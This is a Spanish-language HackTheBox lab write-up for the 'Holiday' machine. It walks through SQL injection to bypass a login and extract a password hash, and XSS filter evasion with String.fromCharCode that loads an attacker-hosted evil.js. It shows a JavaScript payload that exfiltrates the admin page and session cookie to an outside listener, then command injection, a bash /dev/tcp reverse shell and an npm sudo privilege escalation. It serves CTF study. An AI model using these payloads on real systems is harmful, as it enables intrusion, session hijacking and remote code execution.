---
layout: post
toc: true
title: "Holiday - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Web]
author:
  - H4RRIZN
---
![holiday](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/master/_includes/CTFIMG/Holiday/Holiday.png)

## Reconocimiento Inicial
Como siempre iniciamos con un scan para detectar puertos abiertos en el host victima:   
```jsx
nmp -sS --min-rate 1500 -p- --open -vv -n -Pn 10.10.10.25
```
![nmap1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/f253d5ded9dd589d1192d8f6ce6353e19734fcd3/_includes/CTFIMG/Holiday/nmap1.png)

Podemos ver que el resultado nos entrega el puerto 22 y 8000 abiertos. Realizamos otro scan para detectar más los servicios y las versiones sobre estos puertos:   
![nmap2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/f253d5ded9dd589d1192d8f6ce6353e19734fcd3/_includes/CTFIMG/Holiday/nmap2.png)

El resultado es SSH y un servicio HTTP de Node.JS en el puerto 8000.
## Reconocimiento Web
Al ingresar a la web solo vemos la imagen de un hexagono:    
![web0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/web0.png)

Si intentamos ingresar a la ruta de la imagen veremos lo siguiente:     
![web1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/web1.png) 

Al interceptar la petición y cambiar el método por POST seguiremos obteniendo el mismo mensaje:    
![burp0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/burp0.png)

### Fuzzing
Como no tenemos mucho más que ver por esta parte realizaremos fuzzing para encontrar directorios que estén ocultos. Para esta ocasión utilizamos la herramienta de fuzzing dirsearch ya que está incluye la cabecera **`User-Agent`** por defecto. Otras herramientas como wfuzz o gobuster no funcionarán ya que no la incluyen por defecto y tendríamos que agregarla como payload. Ya que la aplicación web está validando esta cabecera:     
![fuzz0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/fuzzing0.png)

Como vemos encontramos diversas rutas como **`login`** y **`admin`**. está ultima redirige a **`login`** al igual que **`logout`**:     
![login0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/login0.png)

Observamos que al ingresar claves por defecto se muestra el mensaje de **`Invalid User`**. Lo que puede servir en principio para enumerar usuarios existentes en el sistema y también para poder identificar un potencial vector de inyección SQL:    
![login1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/db2c435d60d8ff7c988f949f49048b9119f3bae8/_includes/CTFIMG/Holiday/login1.png)

### SQLi
Para probar la inyección SQL interceptaremos la petición POST del login para poder modificarla en el Repeater de BurpSuite.
Si ingresamos una comilla simple (’) podremos ver que sigue apareciendo el mensaje de **`Invalid User`**:    
![sqli0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli0.png)

Pero si ingresamos una doble comilla el mensaje será de **`Error Ocurred`**:    
![sqli1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli1.png)

En base a esto podemos generar una consulta con doble comilla de tipo boolean típica para realizar un bypass del login tal como `" OR "5"="5` :   
![sqli2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli3.png)

Podemos observar que para esta consulta el error es distinto otra vez. Ahora se muestra el mensaje de **`Incorrect Password`** y al observar en el campo de username podemos ver el valor reflejado de **`RickA`**. Lo que nos muestra el usuario en uso.    
En base a esto y ya confirmada la vulnerabilidad realizamos un ordenamiento por columnas:     
![sqli3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli4.png)

Vemos que se ve el mensaje de **`Error Ocurred`** al realizar un ordenamiento por 5 columnas, Realizaremos esto por 100 columnas para determinar el comportamiento de la web:      
![sqli4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli5.png)

Y observamos que seguimos obteniendo el mismo mensaje de error. Por lo que quizás al acertar la columna se muestre otro mensaje como **`Incorrect User`**. Para esto debemos modificar la consulta, como no obtenemos resultados agregamos paréntesis en la consulta por la parte de la comilla y cambiando el numero de las columnas:     
![sqli5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli6.png)

![sqli6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli7.png)

Y vemos que cerrando con doble paréntesis y realizando un ordenamiento por la cuarta columna vemos el mensaje de **`Invalid User`** lo que puede significar que la tabla contiene 4 columnas:     
![sqli7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/b147a5cb3210264113981aff4a4839f549d76b35/_includes/CTFIMG/Holiday/sqli8.png)

Realizamos la petición con el usuario encontrado para confirmarlo:     
![sqli8](https://github.com/H4RRIZN/H4RRIZN.github.io/blob/master/_includes/CTFIMG/Holiday/sqli9.png?raw=true)

### → Obteniendo información:
Ya que confirmamos la cantidad de columnas podemos realizar un ataque de tipo UNION y buscar en donde se refleja el valor de la consulta:    
![union0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/ccb610b85985183d7f64954d512cdfc97741864e/_includes/CTFIMG/Holiday/union0.png)

Para este caso el valor 2 se refleja en el valor del campo **`username`**.  Podemos asegurarnos de esto enviando una cadena:    
![union1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/ccb610b85985183d7f64954d512cdfc97741864e/_includes/CTFIMG/Holiday/union1.png)

Lo primero antes de continuar es determinar la versión de la base de datos en uso para construir ataques en base a este motor de base de datos. Al probar las variantes para detectar la versión notamos que estamos ante el motor de base de datos SQLite en su versión 3.15.0:    
![union_version](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/ccb610b85985183d7f64954d512cdfc97741864e/_includes/CTFIMG/Holiday/union_version.png)

Para extraer las tablas de la base de datos en uso realizamos la siguiente consulta:    
![union_tables](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/ccb610b85985183d7f64954d512cdfc97741864e/_includes/CTFIMG/Holiday/union_tables.png)
Como se ve en la respuesta obtenemos las tablas **`username, notes, bookimgs y sessions`**.

Para extraer las columnas las tablas de la base de datos utilizamos la siguiente consulta. Para este caso será la tabla users:    
![union_columns](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/ccb610b85985183d7f64954d512cdfc97741864e/_includes/CTFIMG/Holiday/union_columns.png)

Observamos que la tabla contiene las columnas **`username`** y **`password`**.
Para el resto de tablas las columnas son las siguientes:

| notes | bookings | sessions |
| --- | --- | --- |
| booking_id | uuid | expired |
| approved | passengerText | sess |
|  | bookingRef |  |
|  | email |  |
|  | total |  |

Realizando la siguiente consulta podemos obtener la contraseña del usuario RickA la cual esta hasheada:   
![rickpass](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/64bf15df8bb617aeec47f039bd11fdd93755381e/_includes/CTFIMG/Holiday/rickpass.png)

Podemos utilizar un servicio online como crackstation para crackear esta contraseña la cual está en formato MD5:
![hashcrack](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/64bf15df8bb617aeec47f039bd11fdd93755381e/_includes/CTFIMG/Holiday/hashcracked.png)

Y tenemos una contraseña para iniciar sesión la cual es **`nevergonnagiveyouup`** la cual corresponde al usuario RickA. Podemos:    
![logged](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/64bf15df8bb617aeec47f039bd11fdd93755381e/_includes/CTFIMG/Holiday/logwcred.png)

Posterior al inicio de sesión ingresamos a cualquiera de los **`UUID`** presentes, dentro de estos podemos notar que tenemos la posibilidad de agregar una nota:    
![noteidenf](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/notedetect.png)

## XSS + Filter Evasion
Como podemos añadir una nota la cual será revisada por un administrador podemos probar una inyección XSS con el fin de robar la cookie del administrador.
```jsx
<script>alert(1)</script>
```
![query1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/query1.png)

Como apreciamos se esta realizando una filtración de los símbolos **`<`** y **`>`**. Seguiremos experimentando para intentar realizar la evasión. Por ejemplo se probaron payloads con elementos **`img`** y **`svg`**. En el cual el elemento **`img`** no se bloquea:     
![querys](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/querys.png)

Como sabemos que podemos utilizar el elemento **`img`** intentaremos cargar una imagen, nos pondremos a la escucha con netcat por el puerto 80 para ver como se esta realizando esta petición. Utilizamos el siguiente payload:    
```jsx
<img src="http://10.10.14.3/img.jpg">
```
![queryimg](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/queryimg.png)
![nc80](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/nc80.png)

Como vemos recibimos una petición GET. Ahora intentaremos crear un nuevo payload ya que hemos notado que se eliminan las doble comillas (**`””`**) por lo que intentaremos introducir la etiqueta script dentro estas doble comillas:  
```jsx
<img src="test><script>alert(1)</script>">
```
![queryimg2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/queryimg2.png)

Podemos ver que efectivamente se eliminaron las doble comillas y a la vez no se han sanitizado los símbolos correspondientes para la etiqueta **`script`**. Para este caso en particular no se ha interpretado la alerta. Pero no podemos descartar que por el lado del administrador que revisa las notas se haya interpretado o no.
### Cookie Hijacking
Como se aprecia a continuación contamos con una cookie de sesión:     
![cookie](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/cookieh1.png)

La idea será robar la del usuario administrador que valida nuestras notas para suplantar su sesión. Es importante considerar que al momento de realizar la llamada a **`document.cookie`** NO se muestra la cookie de sesión en esta llamada:     
![doc.cookie](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/doc.cookie.png)

Por lo que el enfoque será enviar un payload el cual redireccione al administrador a un servidor controlado para obtener la cookie y recibirla de la siguiente manera:     
```bash
<img src="test><script>document.location("http://IP/?cookie=' + document.cookie + '")</script>
```
![largqry1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/querylg1.png)

Observamos que se nos están bloqueando nuevamente los símbolos. Podemos pensar que esto sucede al haber agregado **`document.location`** por lo que modificamos el payload para poder evadir estos filtros. Para este intento reemplazamos **`document.location`** por **`document.write`** de la siguiente forma:     
```bash
<img src="test><script>document.write('<script src="http://10.10.14.3/evil.js"></script>')</script>">
```
![lrgqry2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/querylg2.png)

Nos fijamos que al inicio ya no quita los símbolos pero si nos quita un espacio en la sección interna de **`document.write`** en especifico en **`script src`** lo cual deja como **`scriptsrc`** y luego elimina parte del contenido para volver a filtrar los símbolos. Podemos intentar utilizar funciones como **`String.fromCharCode()`** para realizar la evasión del filtro de caracteres.

En JavaScript, la función **`String.fromCharCode()`** se utiliza para crear una cadena de caracteres a partir de los valores Unicode especificados. Esta función toma uno o más argumentos numéricos y devuelve una cadena que contiene los caracteres correspondientes a esos valores Unicode.

La función **`String.fromCharCode()`** se llama en el contexto de la clase **`String`**. Se utiliza de la siguiente manera:   
```jsx
String.fromCharCode(valor1, valor2, ..., valorN);
```

Aquí, **`valor1`**, **`valor2`**, ..., **`valorN`** son los valores numéricos de los puntos de código Unicode que se desean convertir en caracteres.
```jsx
String.fromCharCode(65);
Output: "A"
```
En este ejemplo, el valor **`65`** se pasa como argumento a **`String.fromCharCode()`**, lo que devuelve la cadena **`"A"`**, que es el carácter correspondiente al código Unicode **`65`**.
Para esto utilizare la siguiente herramienta para generar un payload de este tipo de manera más eficiente:     
![sfcc](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/sfccgen.png)

Copiamos el payload resultante y lo fusionamos con el payload anterior de la siguiente forma:    
```jsx
<img src="test><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,47,101,118,105,108,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
```

Lo añadimos y enviamos:
![sfccquery](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/sfccquery.png)

Y nos ponemos en escucha en un servidor con python3 para ver si se efectúa la petición:     
![nc80-2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/nc80-2.png)

Y vemos que efectivamente la petición llega.
### → Fichero malicioso
El objetivo ahora es almacenar un fichero malicioso con el objetivo de que se solicite como recurso por el usuario administrador con el fin de observar el código fuente de este con el objetivo de buscar algún parámetro distinto con el cual poder robar la cookie:    
```jsx
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65', false);
req1.send();

var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', 'http://10.10.14.3:1337/evil', true);
req2.setRequestHeader('Content-Type', 'text/plain');
req2.send(response);
```
Al almacenar el script en un servidor HTTP con Python3 y ponernos en escucha en este caso en el puerto 1337 con netcat recibimos el código fuente de la web en este caso la que ve el usuario administrador:    
![cookiehs](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/coohiehs.png)

Podemos notar como se expone un campo oculto “cookie” con el valor de **`connect.sid=s%3A1bee6850-7eba-11ee-97fe-c3fb22230dd2.VBSZXnrWknhgjq%2FAelc8T45pbwNd8%2FI%2B54YiIB%2BeIiA`**.

Reemplazamos este valor en nuestro navegador y notamos que al actualizar la página  *impersonamos* la cuenta del usuario Admin:    
![adminlog](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cd43ba2d17b810abfd8473e194c056226851d4ae/_includes/CTFIMG/Holiday/sesshijack.png)

## RCE
Ya que tenemos acceso al panel de administración podemos observar que tenemos la función de  de aprobar las notas:     
![noteapp](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/noteaprov.png)

Enviaremos una nota de prueba para poder aprobarla y observar como se efectúan estas peticiones:     
![testnote](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/addnote.png)

![appnote](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/aprobenotes.png)

Al presionar en Approve el flujo del sitio nos muestra la siguiente página:     
![noteapproved](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/noteaprovved.png)

Vemos que se muestra un apartado para exportar **`Bookings`** y **`Notes`**. Al presionar en cualquiera de estos mientras interceptamos la petición con BurpSuite vemos lo siguiente:      
![burpbook](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/burp-booking.png)

Al seguir la petición se descarga un fichero con los **`Bookings`**. Intentamos modificar el parámetro bookings con algún símbolo para detectar cambios en el flujo:      
![bookparam](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/burp-booking-m.png)

Vemos que al agregar el símbolo **`<`** se produce un error el cual nos revela que solo se aceptan los caracteres del siguiente rango: **`[a-z0-9&\s\/]`**. En ciertas ocasiones el símbolo o carácter **`&`** se utiliza para concatenar comandos, por lo que intentamos aprovecharnos de este para probar inyectar un comando:      
![idtest](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/burp-id.png)

No parece funcionar, así que lo transformamos en formato URL el cual corresponde a %26:       
![urlid](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/burp-hexid.png)

Y como se aprecia tenemos ejecución de comandos. Nos aprovecharemos de esto para ejecutar una reverse shell.

### Shell as algernon
Ya que tenemos una forma de ejecutar código intentaremos depositar un script en bash para realizar el proceso de reverse shell. Primero veremos si contamos con wget para descargar ficheros:     
![wget?](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/burpwget.png)

Y contamos con wget para descargar ficheros, tomemos en cuenta que se agrego **`%20`** lo que representa un espacio. Depositaremos el siguiente script y lo compartiremos con un servidor simple de python para descargarlo utilizando wget:  
```bash
#!/bin/bash

bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```
![bashrev](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/rev.png)

Ahora utilizamos wget para descargar el script. Pero nos encontramos con el primer problema el cual es el formato de la IP sabemos que tenemos caracteres restringidos entonces no podemos utilizar puntos.
![fail1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/wgetrev.png)

Podemos utilizar el siguiente [script](https://github.com/H4RRIZN/IP_Converter) para convertir una dirección IP en distintos formatos con el cual podríamos aprovecharnos:     
![ipconv](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/ipconverter.png)

Como se aprecia podríamos utilizar el formato Decimal y Hexadecimal entregado por el script. Se evidencia que si se realiza un ping a uno de estos se resuelve la dirección IP ingresada en el script. Vamos a probarlo:          
![wgetip](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/wgetip.png)

Vemos que tenemos un código de estado 200, comprobamos que el script se descargo ejecutando **`ls`**:       
![ls](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/lsrev.png)

Desde ya nos ponemos en escucha con **`netcat`** en el puerto indicado en el script. Para este caso es el 443:      
![ncl](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/nc443.png)

Ejecutamos el script:        
![revexec](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/bashrev.png)

Y ganamos acceso:      
![algerpwn](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/d375c446f1ef912200523516bcaafd17c9290323/_includes/CTFIMG/Holiday/ncok.png)

## Privesc
Para escalar privilegios podemos verificar que comandos podemos ejecutar como sudo con **`sudo -l`**:       
![sudol](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/7e052929aea58df28e0ca89d1dc55332b538c3dc/_includes/CTFIMG/Holiday/sudol.png)

Y podemos ejecutar el comando **`npm i`** como sudo. Aprovecharnos del [siguiente](https://gtfobins.github.io/gtfobins/npm/#sudo) recurso que nos explica como poder elevar privilegios.
Según las instrucciones debemos ejecutar la siguiente serie de comandos:
```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```
Debemos adecuarlo a la ruta especificada:
![rootpwn](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/7e052929aea58df28e0ca89d1dc55332b538c3dc/_includes/CTFIMG/Holiday/root.png)

Con esto ya podemos leer las flags y resolveremos el laboratorio.

Pwned! 🏴‍☠️
